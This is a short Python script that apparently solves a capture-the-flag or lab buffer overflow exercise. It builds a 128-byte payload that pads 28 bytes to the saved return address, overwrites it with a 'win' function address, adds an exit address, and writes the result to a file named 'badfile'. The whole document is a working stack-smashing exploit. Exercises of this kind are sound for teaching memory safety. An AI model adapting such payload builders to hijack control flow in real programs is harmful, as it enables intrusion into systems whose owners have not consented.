import struct

b_eip = 28
win = 0x804849b
exit = 0xb7e337f0

atk_vector = 'A'*b_eip
atk_vector += struct.pack('I', win)
atk_vector += struct.pack('I', exit)
atk_vector += 'A' * (128 - len(atk_vector))

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()
